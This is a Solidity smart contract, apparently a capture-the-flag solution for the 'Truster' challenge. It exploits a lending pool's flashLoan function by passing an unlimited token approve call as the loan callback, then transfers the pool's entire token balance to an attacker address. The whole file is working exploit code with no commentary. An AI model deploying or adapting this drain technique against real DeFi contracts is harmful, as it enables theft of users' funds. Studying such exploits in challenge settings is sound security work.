pragma solidity ^0.8.0;

contract TrusterAttack {
  address private _pool;
  address private _token;
  address private _attacker;

  constructor(address pool, address token, address attacker) {
    _pool = pool;
    _token = token;
    _attacker = attacker;
  }

  function attack() external {
    (bool isFlash, ) = _pool.call(
      abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)",
        0,
        address(this),
        _token,
        abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256 - 1))
    );

    require(isFlash, "isFlash");

    (bool isBalance, bytes memory result) = _token.call(
      abi.encodeWithSignature("balanceOf(address)", _pool)
    );

    require(isBalance, "isBalance");

    (uint256 amount) = abi.decode(result, (uint256));

    (bool isTransfer, ) = _token.call(
      abi.encodeWithSignature("transferFrom(address,address,uint256)", _pool, _attacker, amount)
    );

    require(isTransfer, "isTransfer");
  }
}
